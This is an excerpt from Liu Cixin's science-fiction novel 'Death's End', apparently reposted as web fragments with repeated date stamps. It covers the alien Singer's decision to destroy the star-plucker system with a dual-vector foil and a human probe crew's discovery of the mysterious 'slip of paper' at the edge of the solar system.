<p>歌者没有太多的抱怨，生存需要投入更多的思想和精力。宇宙的熵在升高，有序度在降低，像平衡鹏那无边无际的黑翅膀，向存在的一切压下来，压下来。可是低熵体不一样，低熵体的熵还在降低，有序度还在上升，像漆黑海面上升起的磷火，这就是意义，最高层的意义，比乐趣的意义层次要高。要维持这种意义，低熵体就必须存在和延续。</p>
<p>至于这意义之塔的更高端，不要去想，想也想不出什么来，还有危险，更不用说意义之塔的塔顶了，可能根本没有塔顶。回到坐标上来，空间中有许多坐标在穿行，如同母世界的天空中飞翔的矩阵虫。坐标拾取由主核进行，主核吞下空间中弥散的所有信息，中膜的、长膜的和轻膜的，也许有一天还能吞下短膜的。主核记着所有星星的位置，把信息以点阵方式与各种组合的位置模式进行匹配，识别出其中的坐标。据说，主核可以匹配五亿时间颗粒前的位置模式，歌者没有试过，没有意义。在那个遥远的时代，宇宙中的低熵群落比较稀疏，也还都没有进化出隐藏基因和清理基因。而现在——</p>
<p>藏好自己，做好清理。但所有坐标中，只有一部分是有诚意的。相信没有诚意的坐标常常意味着清理空旷的世界，这样做浪费精力，还有一点点害处，因为这些空世界以后还可能用得着。无诚意坐标的发送者真是不可理喻，它们会得到报应的。</p>
<p>判断坐标的诚意有一些可遵循的规律，比如群发的坐标往往都没有诚意。但这些规律都是很粗略的，要想真正有效地判断坐标的诚意，主要靠直觉，这一点种子上的主核做不到，甚至母世界的超核也做不到，这就是低熵体不可取代之处。歌者有这种能力，这不是天赋或本能，而是上万个颗粒的时间积累起来的直觉。一个坐标，在外行看来就是那么一个简单的点阵，但在歌者眼中它却是活的，它的每一个细节都在表达着自己，比如取点的多少，目标星星的标注方式等等，还有一些更微妙的细节。当然，主核也会提供一些相关信息，比如与该坐标有关的历史记录、坐标广播源的方向和广播时间等。这些合而成为一个有机的整体，在歌者的意识中浮现出来的将是坐标广播者本身。歌者的精神越过空间和时间的沟壑，与广播者的精神产生共振，感受它的恐惧和焦虑，还有一些母世界不太熟悉的感情，如仇恨、嫉妒和贪婪等，但主要还是恐惧，有了恐惧，坐标就有了诚意——对于所有低熵体，恐惧是生存的保证。正在这时，歌者看到了一个有诚意的坐标，就在种子航线附近。这是一个用长膜广播的坐标，歌者也不知道自己为什么断定它有诚意，直觉是说不清的。他决定清理一下，反正现在也没有更多的事情可做，这事也不影响他正唱着的歌谣。他判断错了也没关系，清理就是这样，不是一件精确的工作，不要求绝对准确。这也不是急迫的工作，早晚做了就行。这也是这一岗位地位低的原因。</p>
<p>歌者从种子仓库取出一个质量点，然后把目光投向坐标所指的星星，主核指引着歌者的视线，像在星空中挥动一支长矛。歌者用力场触角握住质量点，准备弹出，但当他看到那个位置时，触角放松了。三颗星星少了一颗，有一片白色的星尘，像深渊鲸的排泄物。</p>
<p>已经被清理过了，清理过了就算了，歌者把质量点放回仓库。真够快的。</p>
<p>他启动了一个主核进程来追踪杀死那颗星星的质量点的来源。这是个成功概率几乎为零的工作，但按照规程必须做。进程很快结束，同每次一样，没有结果。歌者很快知道为什么清理来得这么快。他看到了那个世界附近的那一片慢雾，慢雾距那个世界约半个构造长度，如果单独看它，确实难以判断其来源，但与被广播的坐标联系起来，一眼就看出它是属于那个世界的。慢雾表明那是个危险的世界，所以清理来得很快。看来有比自己直觉更敏锐的低熵体。这不奇怪，正如长老所说，在宇宙中，你再快都有比你快的，你再慢也有比你慢的。</p>
<p>一般来说，被广播的单个坐标最终都会被清理，只是时间早晚的问题。你可能认为这个坐标没诚意，但在亿万个低熵世界中有亿万万个清理员，总有认为它有诚意的。低熵体都有清理基因，清理是它们的本能。再说清理只是一件很简单的事，宇宙中到处都有潜在的力量，只需诱发它们为你做事就行了，几乎不耗费什么，也不耽误唱歌。如果歌者有耐心等待，诚意坐标最后都会被其他未知的低熵体清理，但这样对母世界和种子都不利，毕竟他收到了坐标，还向坐标所指的世界看了一眼，这就与那个世界建立了某种联系。如果认为这种联系是单向的那就太幼稚了，要记住伟大的探知可逆定律：如果你能看到一个低熵世界，那个低熵世界迟早也能看到你，只是时间问题。所以，什么事情都等别人做是危险的。下面要做的，就是把这个已经没用的坐标放入叫“墓”的数据库归档，这也是规程规定必须做的。当然与它相关的记录也要一起放入，就像把死者的遗物一起埋葬，反正母世界的习俗是这样。</p>
<p>“遗物”中有一样东西引起了歌者的兴趣，那是死者与另外一个坐标的三次通信记录，用的是中膜。中膜是通信效率最低的膜，也叫原始膜。长膜用得最多，但据说短膜也能用于传递信息，要真行，那就是神了。但歌者喜欢原始膜，他感到原始膜有一种古朴的美，象征着充满乐趣的时代。他经常把原始膜信息编成歌谣，唱起来总是很好听，当然一般听不懂什么，也没必要懂，除了坐标，原始膜的信息中不会有太多有用的东西，只感受其韵律就行了。但这一次，歌者居然懂了一点这些信息，因为其中一部分竟带有自译解系统！歌者只能懂一点点，一个轮廓，却足以看到一个不可思议的过程。首先，由另一个坐标广播了一条信息，原始膜广播，那个世界（歌者把它叫弹星者）的低熵体笨拙地拨弹他们的星星，像母世界上古时代的游吟歌者弹起粗糙的墟琴。就是这条广播信息中包含自译解系统。</p>
<p>虽然那个自译解系统也是很笨拙很原始的东西，但足以使歌者把死者随后发出的一条信息的文本模式与之进行对比，很显然是回答广播信息的。这已经很不可思议了，但先前发广播的弹星者居然又回答了。很有意思，很有意思！歌者确实听说过没有隐藏基因也没有隐藏本能的低熵世界，但这是第一次见到。当然，它们之间的这三次通信不会暴露其绝对坐标，却暴露了两个世界之间的相对距离，如果这个距离较远也没什么，但很近，只有四百一十六个构造长度，近得要贴在一起了。这样，如果其中一个世界的坐标暴露，另一个也必然暴露，只是时间问题。</p>
<p>弹星者的坐标就这样暴露了。在那三次通信过去九个时间颗粒以后，又出现一条记录，弹星者又拨弹他们的星星广播了一条信息，这……居然是一个坐标！主核确定它是坐标。歌者转眼看看那个坐标所指的星星，发现它也被清理了，大约是在三十五个时间颗粒之前。歌者认为刚才自己想错了，弹星者还是有隐藏基因的，因为它有清理基因，不可能没有隐藏基因。但像所有坐标广播者一样，它自己没有清理的能力。</p>
<p>很有意思，很有意思。为什么清理死者的低熵体没有清理弹星者？原因很多。可能它们没有注意到这三次通信，原始膜信息总是不引人注意的。但亿万个世界中总会有注意到的，歌者就是一个。其实如果没有歌者，也会被其他低熵体注意到，只是时间问题。也许它们曾注意到过，但没有隐藏基因的低熵群落威胁不大，嫌麻烦。</p>
<p>但大错特错！泛泛来说，假使弹星者真的没有隐藏基因，它就不怕暴露自己的存在，就会肆无忌惮地扩张和攻击。至少在死前是这样。</p>
<p>但具体到这一个，更复杂一些。前面的三次通信，加上又一次的坐标广播，再到六十个时间颗粒后，对死者的那次来自别处的长膜坐标广播。这一连串事件构成了一个不祥的图景，昭示着危险。对死者的清除已经过去了十二个时间颗粒，弹星者应该意识到自己的坐标已经暴露，那此时唯一的选择就是把自己裹在慢雾中，让自己看上去是安全的，那样便没人会去理他们。也许是没有这个能力，但从它已经能够拨弹星星发出原始膜广播看，这段时间足够它拥有这个能力，也许它只是不想这么做。如果是后者，那弹星者极其危险，比死者要危险许多。</p>
<p>藏好自己，做好清理。歌者把目光投向弹星者，看到那是一颗很普通的星星，至少还有十亿时间颗粒的寿命。它有八颗行星，其中四颗液态巨行星，四颗固态行星。据歌者的经验，进行原始膜广播的低熵体就在固态行星上。歌者启动了大眼睛的进程，他很少这么做，这是越权行为。“你干什么？大眼睛现在很忙。”种子的长老说。</p>
<p>“有一个低熵世界，我想近些看看。”歌者回答。“你的工作，远远看一眼就足够了。”</p>
<p>“只是好奇。”“大眼睛有更重要的目标要观测，没时间满足你的好奇，做你的事去吧。”</p>
<p>歌者没再继续请求，清理员是种子中地位最低的岗位，总是被轻视，认为这是容易做的琐碎工作。轻视者们却忘了，被广播的坐标往往都是危险的，比那些隐藏的大多数更危险。剩下的事就是清理了，歌者再次从仓库中取出那个质量点。他突然想到清理弹星者是不能用质量点的，这个星系的结构与前面已死的那个星系不同，有死角，用质量点可能清理不干净，甚至白费力气，这要用二向箔才行。可是歌者没有从仓库里取二向箔的权限，要向长老申请。“我需要一块二向箔，清理用。”歌者对长老说。</p>
<p>“给。”长老立刻给了歌者一块。二向箔悬浮在歌者面前，是封装状态，晶莹剔透。虽然只是很普通的东西，但歌者很喜欢它。他并不喜欢那些昂贵的工具，太暴烈，他喜欢二向箔所体现出来的这种最硬的柔软，这种能把死亡唱成一首歌的唯美。</p>
<p>但歌者有些不安，“您这次怎么这样爽快就给我了？”“这又不是什么贵重东西。”</p>
<p>“可这东西如果用得太多了，总是……”“宇宙中到处都在用。”</p>
<p>“是，到处都在用，可我们以前还是多少有些节制的，现在……”“你是不是听到什么了？”长老在歌者的思想体中翻找起来，让歌者一阵战栗。长老很快找到了歌者听到的传说，这也不是什么罪过，都是种子上公开的秘密。是关于母世界与边缘世界的战争，以前不断有战报传来，后来就没有了，说明战事不顺利，甚至陷入危机。但母世界与边缘世界不可能共存，必须消灭边缘世界，否则自己将被毁灭。如果战争无法取得胜利，只能……</p>
<p>“是不是母世界已经准备二向化了？”歌者问，其实长老已经知道了他的问题。长老没有回答，也许是默认了。</p>
<p>如果真是这样，那是莫大的悲哀。歌者无法想象那种生活，在意义之塔上，生存高于一切，在生存面前，宇宙中的一切低熵体都只能两害相权取其轻。歌者把这些想法从思想体中删除了，这不是他该想的，这是自寻烦恼。他现在要想的是刚才的歌唱到什么地方了，想了好长时间才想起来，他接着唱：……</p>
<p>时间上有美丽的条纹摸起来像浅海的泥一样柔软</p>
<p>她把时间涂满全身然后拉起我飞向存在的边缘</p>
<p>这是灵态的飞行我们眼中的星星像幽灵</p>
<p>星星眼中的我们也像幽灵……</p>
<p>2016-01-30</p>
<p>歌声中，歌者用力场触角拿起二向箔，漫不经心地把它掷向弹星者。</p>
<p>掩体纪元67年，“星环”号</p>
<p>2016-01-30</p>
<p>“我们在哪儿？”程心问，这时她可以发出沙哑的声音来，但还是无力控制自己的身体。</p>
<p>AA又摇摇头，“不知道，好像在飞船上。”她们继续在木星的黄色光晕中飘浮着，像在梦境中一般。</p>
<p>“你们在‘星环’号上。”这声音来自她们旁边刚刚弹出的一个信息窗口，窗口中显示着一个白发苍苍的老人，程心一眼就认出了他是曹彬。看到他的老态，她意识到自己又跨越了一大段岁月。曹彬告诉她，现在是掩体纪元67年5月19日，她才知道自上次短暂的苏醒后，五十六年又过去了。自己在时间之外逃避生活，看着别人在转瞬间老去，这令她的心中充满了愧疚，她决定，不管以后发生什么，这都是自己的最后一次冬眠了。</p>
<p>2016-01-30</p>
<p>曹彬告诉她们，她们所在的飞船是“星环”号的最新一代型号，三年前才建造完成。他说在半个世纪前的星环城事件后，他和毕云峰都被判有罪，但都在服刑后不久即被释放。毕云峰已经在十多年前去世，曹彬带来了他临终前对她们的问候，这让程心的双眼湿润了。曹彬告诉她们，现在木星群落的大型太空城已经增加到五十二座，大部分都形成了组合体，她们能看到的是木星二号组合体。由于太阳系防御系统的完善，所有的城市在二十年前都成为了木星的卫星，只有在出现打击警报后才会改变轨道躲进掩体区。</p>
<p>“城市中的生活又变得像天堂一样了，可惜你们不能去看，没有时间了。”曹彬说到这里突然停了下来。程心和AA交换了一个不安的眼神，她们现在知道他之前的滔滔不绝可能就是为了推迟这一时刻。“打击警报出现了吗？”程心问。</p>
<p>曹彬点点头，“是的，警报出现了，在半个世纪中有过两次误报，都差点把你们唤醒，但这一次是真的。孩子们——我已经一百一十二岁了，可以这么叫你们了吧——孩子们，黑暗森林打击终于降临了。</p>
<p>2016-01-30</p>
<p>程心的心骤然紧缩，不是因为打击的降临，一个多世纪以来，人类世界已经为此做好了一切准备，但她却敏感地觉察到事情不对。她们按照约定被唤醒了，恢复到这种状态至少需要四五个小时，就是说警报发出已经有一段时间了，可窗外的木星组合体二号既没有紧急解体，也没有改变轨道，仍若无其事地作为木星的卫星运行着。再看看曹彬，这个一百多岁的老人表情也太平静了，似乎还隐含着绝望。</p>
<p>“你现在是在——”AA问。“我在太阳系预警中心。”曹彬抬手指指身后说。</p>
<p>程心看到曹彬身后是一个控制中心之类的大厅，空间几乎被泛滥的信息窗口所淹没。那些窗口在大厅中到处飘浮，不断有新出现的窗口挤到前面，但很快又被后来的窗口遮盖，像溃堤后涌出的洪水一般。但大厅中的人们似乎什么也没做。那里的人有一半穿着军装，他们或者靠着办公桌站立，或者静坐着，所有人都目光呆滞，脸上呈现着与曹彬一样的不祥的平静。不应该是这样子的，程心想。这不像一个已经进入掩体、面对打击胸有成竹的世界，倒是很像三个多世纪前，不，已经是四个世纪前，三体危机刚出现时的状态。那时，在PIA和PDC各种机构的办公室里，程心到处都能见到这样的气氛和表情，显示着一种面对宇宙中超强力量的绝望，一种放弃一切的麻木和漠然。大厅中的人们大部分沉默着，但也有少数人正脸色黯然地低声交谈着什么。程心看到一个呆坐的男人，桌上一只杯子倒了，蓝色的饮料从桌面一直流到裤子上，但他全然没有理会。在另一侧，在一个被永远置顶的显示着复杂趋势图的大面积信息窗口前，一名军人和一个平民女性拥抱在一起，那女人的脸上有隐隐的泪光……</p>
<p>“为什么还不进掩体？！”AA指着舷窗外的太空城组合体问。“没有必要了，掩体是没用的。”曹彬垂下双眼说。</p>
<p>“光粒现在距太阳有多近了？”程心问。“没有光粒。”“那你们发现了什么？”</p>
<p>曹彬凄惨地笑了起来，“一张小纸条。”</p>
<p>掩体纪元66年，太阳系外围</p>
<p>2016-01-30</p>
<p>在程心苏醒前一年，太阳系预警系统发现了一个不明飞行物以接近光速的速度从奥尔特星云外侧掠过，最近时距太阳仅一点三光年。这个物体体积巨大，光速飞行时与空间稀薄的原子和尘埃碰撞激发的辐射十分强烈。预警系统还观测到，这个物体在飞行中曾进行过一次小角度转向，避开前方的一小片星际尘埃，然后再次转向回到原航线。几乎可以肯定，这是一艘智慧飞船。</p>
<p>这是太阳系中的人类第一次亲眼见到三体之外的外星文明。</p>
<p>2016-01-30</p>
<p>当外星飞船在观测的视野中渐行渐远时，人们并没能够松一口气，因为预警系统又有了一个更令人担忧的发现：外星飞船没有向太阳发射光粒，但发射了另外一个东西。这个物体也是以光速向太阳发射，但丝毫没有产生光粒的碰撞辐射，在所有电磁波段完全不可见，预警系统是通过引力波发现它的。这个物体不间断地发射出微弱的引力波，这种引力波频率和强度都恒定不变，没有搭载任何信息，可能是发射体固有的某种物理性质所致。预警系统在最初探测到这种引力波并定位其发射源时，以为是外星飞船发出的，但很快探测到引力波的发射源与飞船分离，以接近光速的速度飞向太阳系。对观测数据的分析还表明，发射体并没有精确地对准太阳，如果按它目前的轨道运行，它将从火星轨道外侧掠过太阳，如果它的目标是太阳的话，这是相当大的误差。这也从另一个方面表明它与光粒不同：在已有的两次对光粒的观测数据中，光粒发射后，在考虑恒星运行的提前量的前提下，都精确对准目标恒星，不需再进行任何修正，可以认为，光粒就是一块以惯性飞行的光速石头。现在对引力波源的精确跟踪表明，发射体并没有进行过任何轨道修正，似乎表明它的目标不是太阳，这也给人们带来了一点安慰。</p>
<p>在接近距太阳一百五十个天文单位时，发射体的引力波频率开始迅速降低，预警系统很快发现，这是发射体减速造成的。在几天的时间里，它的速度由光速急剧降低到光速的千分之一，而且还在继续降低中。这么低的速度对太阳不会构成威胁，这又是一个安慰，同时，在这个速度上，人类的太空飞行器可以与它并行飞行，就是说，可以出动飞船拦截它了</p>
<p>2016-01-30</p>
<p>白Ice原名白艾思，苏醒后为了使自己显得不那么落后于时代，改成了现代常用的中英文混合名。他曾经是丁仪的博士生，在危机纪元末冬眠，二十二年前才苏醒。一般来说，这么长的时间跨度使人很难再跟上时代，但理论物理学自有其特殊性。如果说，智子的封锁使公元世纪的物理学家到威慑纪元仍不过时的话，那么，环日加速器的建立则使物理学的基础理论领域处于重新洗牌的状态。早在公元世纪，超弦理论就被认为是十分超前的理论，是22世纪的物理学。环日加速器的建立，使得超弦理论有可能直接由实验验证，结果是一场灾难，被推翻的部分远多于被证实的，包括三体世界曾经传送的东西也被证伪，但按照三体文明后来达到的技术高度，他们的基础理论不可能错成这样，只能说明他们在基础理论方面也对人类进行了欺骗。而白Ice在危机纪元末提出的理论模型是少有的被环日加速器部分证实的东西。当他苏醒时，物理学界已经重新站到同一起跑线上，他则脱颖而出获得很高的声誉，又用了十多年时间，他重新回到物理学的最前沿。</p>
<p>2016-01-30</p>
<p>似曾相识吧。”瓦西里做了一个囊括一切的手势说。</p>
<p>“是啊，但人类的自信和傲慢已经荡然无存了。”白Ice说。</p>
<p>2016-01-30</p>
<p>瓦西里深有同感。看看航线的后方，海王星已经变成一个幽蓝色的小点，太阳也只是一个黯淡的小光团，在天线表面连影子都投不出来。当年那由两千艘恒星级战舰组成的壮丽方阵在哪里？现在只有这形单影只的两艘飞船，全体人员不到一百人。“阿拉斯加”号与“启示”号的距离近十万千米，完全看不到。“阿拉斯加”号并不仅仅是作为定位网络的另一端，上面还有一个探测分队，编制与“启示”号上的一样，按总参谋部的说法是后备队，看来上层对此行的险恶做了充分的估计。在太阳系这冷寂的边缘，脚下的天线仿佛是宇宙中唯一的孤岛。瓦西里想仰天长叹，但又觉得没有意思</p>
<p>2016-01-30</p>
<p>这一带是近两个世纪前末日战役古战场的轨道范围，掩体工程开始以后，经常发现古战舰的遗物，它们有的出现在掩体世界的博物馆中，有的则在黑市里流通。白Ice握住那个零件，感到一股寒气透过宇宙服的手套直入骨髓。他松手后，零件继续在空中旋转着，仿佛被附于其上的灵魂所驱动。白Ice把目光移开，遥望远方，只看到深不见底的空旷，那两千艘战舰和上百万人的遗骸已经在这片黑暗冷寂的太空中运行了近两个世纪，那些牺牲者流的血早就由冰屑升华成气体消散了。</p>
<p>2016-01-30</p>
<p>“我们这次探测的东西，可能比水滴更险恶。”白Ice说。</p>
<p>“是啊，当时对三体已经算是熟悉，可对发出这东西的世界，我们一无所知……白博士，你猜过我们将遇到什么样的东西吗？”“只有大质量的物体才能发射引力波，那东西质量和体积应该都很大吧，说不定本身就是一艘飞船……不过，这种事，意外就是正常。”</p>
<p>探测编队继续航行了一个星期，将自己和引力波发射源的距离缩短至一百万千米。在此之前，编队已经减速，现在速度已经降至零并开始向太阳系方向加速，这样，当发射体追上编队时，两者将平行飞行。探测工作主要由“启示”号完成，“阿拉斯加”号退至十万千米之外观察。距离继续缩短，发射体距“启示”号仅一万千米左右，这时，它发出的引力波信号已经十分清晰，可以进行精确定位，但在那个位置上，雷达探测没有任何回波，可见光观测也空空如也。接着，距离缩短至一千千米，引力波发射源的位置仍然看不到任何东西。</p>
<p>“启示”号上的人们陷入惶恐之中，起航前曾设想过各种情况，唯独没有想到与目标近在咫尺，视野中却一无所有。瓦西里请示预警中心，在四十多分钟的延时后收到中心指令，继续缩短与目标的距离，直到近至一百五十千米！这时，可见光观测系统有所发现，在引力波发射位置有一个小白点，从飞船上用普通望远镜也能看到那个白点。于是，“启示”号派出一艘无人太空艇前往探测。太空艇向目标飞去，距离迅速缩短，五百千米，五十千米，五百米……最后，太空艇在距目标五米处悬停，它发回的高清晰全息图像，让两艘飞船上的人们看到了这个从外太空射向太阳系的东西——一张小纸条。</p>
<p>2016-01-30</p>
<p>只能这么形容它，它的正式名称是长方形膜状物，长八点五厘米，宽五点二厘米，比一张信用卡略大一些，极薄，看不出任何厚度，表面呈纯白色，看上去就是一张纸条。</p>
<p>探测小组的成员都是最优秀的专业人员和指挥官，都有着冷静的思维，但直觉的力量还是压倒了一切。他们曾准备着遭遇巨大的入侵物，甚至有人猜测是一艘如同木卫二般大小的飞船，从它所发射的引力波强度看这是完全可能的。看着这张来自外太空的纸条（后来他们就这么称呼它），他们都长长地出了一口气，把悬了许久的心放了下来。在理智上他们并没有放松警惕，这东西也可能是武器，可能具有毁灭两艘飞船的力量，但要说它能够摧毁整个星系，那确实太难以置信了。在外观上，它是那么纤细无害，像夜空中飘着的一根白羽毛。纸写的信早已消失，但人们从描写古代世界的电影中看到过那东西，所以纸条在他们眼中又多了一分浪漫。</p>
<p>2016-01-30</p>
<p>检测表明，纸条对任何频段的电磁波都不反射，它呈现的白色不是反射外界的光线，而是自身发出的淡淡的白光，没有检测到任何其他辐射。由于包括可见光在内的任何电磁波都能穿透纸条，纸条实际是透明的，在近距离拍摄的图像上，能够透过它看到背后的星星。但由于它自身发出的白光的干扰，太空背景又很暗，因此，它从远处看呈现不透明的白色。至少从外表上看纸条是无害的。</p>
<p>2016-01-30</p>
<p>也许这真的是一封信？</p>
<p>由于无人太空艇上没有合适的抓取工具，只好又派出一艘太空艇，艇上带有一只机械臂，试图用一个密封的小抓斗抓取纸条。当机械臂把张开的抓斗伸向纸条时，两艘飞船上人们的心又悬了起来。这一幕也似曾相识。</p>
<p>奇怪的事情出现了，当抓斗合拢把纸条扣在其中、机械臂回缩时，纸条从密封的抓斗中漏了出来，仍在原位不动。反复试了几次，结果都一样。“启示”号上的控制者控制机械臂去接触纸条，臂杆从纸条中穿过，两者都完好无损，机械臂没有感觉到任何阻力，纸条的位置也没有丝毫移动。最后，控制者操纵太空艇缓缓移向纸条，试图推动它。当艇身与纸条接触后，后者没入艇身内，随着太空艇的前移，又从艇尾出现，保持原状。在纸条穿过艇身的过程中，太空艇内部系统没有检测到任何异常。这时，人们知道纸条不是寻常之物，它像一个幻影，与现实世界中的任何物体都不发生作用。它也像一个小小的宇宙基准面，精确地保持原位不动，任何接触都不可能改变它的位置或者运行轨道丝毫</p>
<p>2016-01-30</p>
<p>白Ice笑了起来，“再简单不过的事，你忘记《古兰经》中的故事了？如果大山不会走向穆罕默德，穆罕默德可以走向大山。”</p>
<p>于是，“启示”号缓缓驶向纸条，与它接触后使它进入飞船内部，然后慢慢调整位置，使纸条悬浮在飞船的实验舱中，如果在研究中需要移动纸条，则只能通过移动飞船本身来做到。这种奇特的操纵开始有些困难，好在“启示”号原是一艘勘探柯伊伯带小天体的飞船，具有优良的位置控制能力，引力波天线也加装了多达十二台微调发动机，在飞船的A.I.熟悉后，操纵就变得快捷而精确了。如果这个世界对纸条无法施加任何作用，那就只能让世界围着它运动了。这是一个奇特的场景，纸条位于“启示”号的内部中心，但在动力学上与飞船没有任何关系，两者只是重叠着以相同的速度向太阳系运动。</p>
<p>进入飞船后，由于背景光的增强，纸条透明的性质更明显了，透过它可以清晰地看到后面的景物。它此时不再像纸条，而像一小张透明膜，仅以其自身发出的弱光显示其存在，但人们仍把它称为纸条。当背景光很强时，甚至会在视觉上失去它，研究者们只得把实验舱的照明调到很暗，这样纸条才能醒目些。研究者们首先测定纸条的质量，在这种情况下只能通过测定它产生的引力来进行，但在引力测定仪的最高精度上没有任何显示，所以纸条的质量可能极小，甚至为零。对于后一种情况，有人猜测它是不是一个宏观化的光子或中微子，但从其规则的形状看，显然是人工制造物。</p>
<p>对纸条的分析没有进一步的成果，因为所有频段的电磁波穿透它后，都观察不到任何衍射现象，各种强度的磁场对它也没有任何影响，这东西似乎没有内部结构。</p>
<p>2016-01-30</p>
<p>二十多个小时过去了，探测小组对纸条仍然接近一无所知，只观察到一个现象：纸条发出的光和引力波在渐渐减弱，这意味着它发出的光和引力波可能是一种蒸发现象。由于这两者是纸条存在仅有的依据，如果它们最后消失，纸条也就消失了。</p>
<p>2016-01-30</p>
<p>“别这样！这一点儿都不好玩儿！”他大喊道，然后离开工作了二十多个小时的实验舱回到自己的舱室中。</p>
<p>一进门，白Ice就把照明关上，想睡觉。但在黑暗中他突然有一种不安，感觉纸条随时会从某个方向发着白光飘进来，于是又把照明打开，他就悬浮在这柔和的亮光中，陷入了回忆。与导师的最后分别是一百九十二年前的事了，现在仍历历在目。那是一个黄昏，他们两人从地下城来到地面，开车进入沙漠。丁仪喜欢这样，他喜欢在沙漠中散步思考，甚至喜欢在沙漠中讲课，这有时让他的学生苦不堪言。他曾这样解释这种怪癖：“我喜欢荒凉的地方，生命对物理学是一种干扰。”</p>
<p>那天的天气很好，没有风沙，初春的空气中有一种清新的味道。师生二人躺在一道沙坡上，华北沙漠笼罩在夕阳中。往日，白艾思觉得这些连绵起伏的沙丘很像女人的胴体（这好像也是经导师点拨悟出的），但现在感觉它们像一个裸露的大脑，这大脑在夕阳的余晖中呈现出迷离的沟回。再看天空，今天居然在灰蒙蒙中显出一点久违的蓝色，像即将顿悟的思想。丁仪说：“艾思啊，我今天要对你说的这些话，你最好不要对别人说，如果我回不来你也不要对别人说，倒没什么特别的原因，只是不想让人家笑话。”</p>
<p>“丁老师，那你可以等回来后再对我说。”白艾思并不是在安慰丁仪，他说的是真心话，这时他仍沉浸在胜利的幻想和狂喜中，认为丁仪此行并没有什么太大的危险。“首先回答我一个问题。”丁仪没有理会白艾思的话，指指夕阳中的沙漠说，“不考虑量子不确定性，假设一切都是决定论的，知道初始条件就可以计算出以后任何时间断面的状态，假如有一个外星科学家，给它地球在几十亿年前的所有初始数据，它能通过计算预测出今天这片沙漠的存在吗？”</p>
<p>白艾思想了想说：“当然不能，因为这沙漠的存在不是地球自然演化的结果，沙漠化是人类文明造成的，文明的行为很难用物理规律把握吧。”“很好，那为什么我们和我们的同行，都想仅仅通过对物理规律的推演，来解释今天宇宙的状态，并预言宇宙的未来呢？”</p>
<p>丁仪的话让白艾思有些吃惊，他以前从未表露过类似的思想。白艾思说：“我感觉这已经是物理学之外的事了，物理学的目标是发现宇宙的基本规律，比如人类使地球沙漠化，虽不可能直接从物理学计算出来，但也是通过规律进行的，宇宙规律是永恒不变的。”</p>
<p>“嘿嘿嘿嘿嘿嘿……”丁仪突然怪笑起来，后来回想起来，那是白艾思听到过的最邪恶的笑，其中有自虐的快感，有看着一切都坠入深渊时的兴奋，用喜悦来掩盖恐惧，最后迷恋恐惧本身，“你的最后一句话！我也常常这样安慰自己，我总是让自己相信，在这场伟大的盛宴中，永远他妈的有一桌没人动过的菜……我就这样一遍遍安慰自己，在死前我还会再念叨一遍的。”白艾思感觉丁仪走得更远了，如梦呓一般，他不知该说什么。</p>
<p>丁仪接着说：“在危机初期，当智子首次扰乱加速器时，有几个人自杀。我当时觉得他们不可理喻，对于搞理论的，看到那样的实验数据应该兴奋才对。但现在我明白了，这些人知道的比我多，比如杨冬，她知道的肯定比我多，想得也比我远，她可能知道一些我们现在都不知道的事。难道制造假象的只有智子？难道假象只存在于加速器末端？难道宇宙的其他部分都像处女一样纯真，等着我们去探索？可惜，她把她知道的都带走了。”“如果她那时和您多交流一些，也许就不会走那条路。”</p>
<p>“那我可能和她一起死。”丁仪把身边的沙挖了一个坑，看着上面的沙像水一样流下来，“如果我回不来，我屋里那些东西都归你了，我知道，你对我从公元世纪带来的那些玩意儿很眼馋。”</p>
<p>“那是，特别是那一套烟斗……不过，我想我得不到那些东西的。”“但愿如此吧，我还有一笔钱……”“老师，钱的话……”</p>
<p>“我是想让你用它去冬眠，时间越长越好，当然，这得你自愿。我有两个目的：一是想让你替我看看结局，物理学的大结局；二是……怎么说呢，不想让你浪费生命，等人们确定物理学是存在的，你再去做物理也不迟嘛。”“这好像是……杨冬的话。”</p>
<p>“可能并非妄言。”这时，白艾思注意到了丁仪刚才在沙坡上挖出的小坑，那个坑在迅速扩大。他们赶紧站起来退到一旁，看着沙坑扩张，坑在扩大的同时也在加深，转瞬间，底部就没入黑影中看不到了，沙流从坑的边沿汹涌地流入，很快，坑的直径已经扩大到上百米，附近的一个沙丘被坑吞没了。白艾思向车跑去，坐到驾驶位上，丁仪也跟着坐上来。这时，白艾思发现车随着周围的沙一起缓缓向坑的方向移动，他立刻发动了引擎，车轮转动起来，但车仍继续向后移动。</p>
<p>丁仪说着，又发出那邪恶的笑：“嘿嘿嘿嘿嘿嘿嘿……”白艾思把电动引擎的功率加到最大，车轮疯狂地旋转着，搅起片片沙浪，但车体却不可遏止地随着周围的沙子向坑移动，像放在一张被拉动的桌布上的盘子。</p>
<p>“尼亚加拉瀑布！尼亚加拉瀑布！嘿嘿嘿嘿……”丁仪喊道。白艾思回头一看，见到了使他血液凝固的景象：沙坑已经扩大到目力可及的范围，整个沙漠都被它吞没，一眼望去，世界就是一个大坑，下面深不见底，一片黑暗；在坑沿上，流沙气势磅礴地倾泻而下，形成黄色的大瀑布。丁仪说得并不准确，尼亚加拉瀑布只相当于这恐怖沙瀑微不足道的一小段，沙瀑从附近的坑沿一直延伸至远在天边的坑的另一侧，形成一个漫长的沙瀑大环，滚滚下落的沙流发出轰隆隆的巨响，仿佛世界在解体一般！车继续向坑沿滑去，且速度越来越快，白艾斯拼命踩住功率控制板，但无济于事。</p>
<p>“傻瓜，你以为我们能逃脱？”丁仪怪笑着说，“逃逸速度，你怎么不算算逃逸速度？你是用屁股读的书吗？嘿嘿嘿嘿……”车越过了坑沿，在沙瀑中落下去，周围一起下落的沙流几乎静止了，一切都在向深不见底的黑暗中下坠！白艾思在极度惊恐中尖叫起来，但他听不到自己的声音，只听到丁仪的狂笑。</p>
<p>“哇哈哈哈哈哈……没有没被动过的宴席，没有没被动过的处女，哇嘻嘻嘻嘻嘻嘻……哇哈哈哈哈哈……”白Ice从噩梦中醒来，发现自己已是满身冷汗，周围也悬浮着许多汗滴。他浮在半空僵了一会儿后，冲出去，来到另一间高级舱室，费了好大劲儿才叫开门，瓦西里也正在睡觉。</p>
<p>2016-01-30</p>
<p>“将军，不要把那个东西，那个他们叫纸条的东西放在飞船里；或者说不要让‘启示’号停在那东西上，立刻离开它，越远越好！”</p>
<p>“你发现什么了吗？”“没有，只是直觉。”</p>
<p>“你脸色很不好，是累了吧？我觉得你过虑了，那东西好像……好像什么都不是，里面什么都没有，应该是无害的。”白Ice抓住瓦西里的双肩，直视着他的眼睛说：“别傲慢！”</p>
<p>“什么？”“我说别傲慢，弱小和无知不是生存的障碍，傲慢才是，想想水滴吧！”</p>
